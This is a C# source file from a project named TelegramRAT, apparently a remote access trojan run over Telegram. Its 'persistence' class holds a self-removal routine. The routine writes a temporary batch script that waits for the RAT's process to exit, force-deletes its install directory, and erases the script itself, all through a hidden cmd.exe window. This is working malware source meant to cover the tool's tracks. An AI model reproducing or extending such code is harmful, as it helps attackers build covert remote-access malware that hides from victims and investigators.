using System;
using System.IO;
using System.Threading;
using System.Management;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace TelegramRAT
{
    internal sealed class persistence
    {
        // Remove self from system
        public static void uninstallSelf()
        {
            Console.WriteLine("[+] Uninstalling from system...");

            string batch = Path.GetTempFileName() + ".bat";
            string currentPid = Process.GetCurrentProcess().Id.ToString();

            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine(":l");
                sw.WriteLine("Tasklist /fi \"PID eq " + currentPid + "\" | find \":\"");
                sw.WriteLine("if Errorlevel 1 (");
                sw.WriteLine(" Timeout /T 1 /Nobreak");
                sw.WriteLine(" Goto l");
                sw.WriteLine(")");
                sw.WriteLine("Rmdir /S /Q \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
            }

            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C " + batch + " & Del " + batch,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

            Environment.Exit(1);
        }


    }
}
